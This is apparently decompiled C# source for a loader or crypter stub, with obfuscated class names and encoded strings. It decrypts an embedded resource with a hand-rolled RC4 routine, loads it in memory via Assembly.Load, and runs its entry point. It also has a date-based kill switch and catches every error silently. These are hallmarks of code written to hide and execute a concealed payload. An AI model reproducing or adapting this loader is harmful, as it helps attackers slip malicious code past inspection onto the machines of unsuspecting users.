using System;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;

namespace ns0;

internal sealed class Class0
{
	internal sealed class Class1
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 230)]
		private struct Struct1
		{
		}

		private static readonly char[] char_0;

		private static readonly char[] char_1;

		private static readonly string[] string_0;

		internal static byte byte_0/* Not supported: data(00) */;

		static Class1()
		{
			char_1 = new char[115];
			char[] array = new char[8];
			array[7] = 'Ȩ';
			array[3] = 'ǭ';
			array[6] = '㶡';
			array[4] = 'ㅐ';
			array[2] = '⽪';
			array[0] = '⫅';
			array[1] = '\u0092';
			array[5] = 'ⴗ';
			string_0 = new string[4];
			char_0 = array;
		}
	}

	private static void Main(string[] args)
	{
		if (DateTime.Now > new DateTime(635308487601904344L))
		{
			throw new Exception();
		}
		object[] parameters = new object[0];
		new Random().Next(300, 750);
		long num = Environment.TickCount;
		_ = Environment.TickCount - num;
		try
		{
			ResourceManager resourceManager = new ResourceManager(Class2.smethod_0("\uf8b2\uf8a5\uf8b3", 63680), Assembly.GetExecutingAssembly());
			byte[] rawAssembly = smethod_0((byte[])resourceManager.GetObject(Class2.smethod_0("\uf29f\uf287\uf2b6\uf2b0\uf29e\uf282\uf2b2\uf2ee\uf2ef\uf2b6\uf2e3\uf281\uf2a3", 61959)), Class2.smethod_0("\ue653\ue675\ue65d\ue65a\ue64f\ue60c\ue65c\ue65d\ue60c\ue655\ue64a\ue668\ue607\ue60b\ue674\ue60d\ue674\ue67b\ue60c\ue650\ue655\ue64c\ue66e\ue665\ue671\ue64e\ue667\ue674\ue654\ue66f\ue668\ue67b\ue66c\ue66c\ue66a\ue679\ue656\ue64e\ue672\ue64a\ue64a\ue607\ue66f\ue648\ue64c\ue606\ue60b\ue655\ue67a\ue674\ue656\ue668\ue60e\ue60d\ue65a", 58925));
			resourceManager.ReleaseAllResources();
			Assembly assembly = Assembly.Load(rawAssembly);
			if (assembly.EntryPoint!.GetParameters().Length > 0)
			{
				parameters = new object[1] { args };
			}
			assembly.EntryPoint!.Invoke(null, parameters);
		}
		catch
		{
		}
	}

	public static byte[] smethod_0(byte[] byte_0, string string_0)
	{
		byte[] bytes = Encoding.Default.GetBytes(string_0);
		byte[] array = new byte[256];
		byte[] array2 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = (byte)i;
			array2[i] = bytes[i % bytes.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array[i] + array2[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < byte_0.GetLength(0); j++)
		{
			i = (i + 1) % 256;
			num = (num + array[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
			int num2 = (array[i] + array[num]) % 256;
			byte_0[j] ^= array[num2];
		}
		return byte_0;
	}
}
